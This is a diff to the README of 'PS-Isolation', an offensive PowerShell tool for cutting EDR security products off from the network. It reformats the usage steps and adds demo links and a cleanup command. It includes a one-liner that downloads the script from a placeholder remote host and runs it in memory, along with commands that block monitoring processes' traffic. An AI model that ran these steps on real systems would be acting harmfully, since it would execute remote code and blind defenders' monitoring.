@@ -23,12 +23,29 @@ PS-Isolation is a specialized tool designed to prevent EDR (Endpoint Detection a
 
 - Import the script in memory from a remote HTTP server 
 
-``IEX(New-Object Net.WebClient).downloadString('http://xxx.xxx.xxx/PSisolation.ps1')``
+````
+IEX(New-Object Net.WebClient).downloadString('http://xxx.xxx.xxx/PSisolation.ps1')
+````
 
 - Block outgoing traffic by running directly
 
-``Block-MonitoringProc``
+````
+Block-MonitoringProc
+````
+https://github.com/user-attachments/assets/a8b62fc7-5132-477b-9489-c569c41bcc78
 
-or a specific process you want with : 
+- or a specific process you want with : 
 
-``Block-SpecificProcessTraffic``
+````
+Block-SpecificProcessTraffic
+````
+
+- When you're done, run this to remove all rules created by the tool :
+
+````
+Unblock-AllFilters
+````
+
+
+https://github.com/user-attachments/assets/a647de1e-9314-4d73-886c-ba8f4cbb7356
+
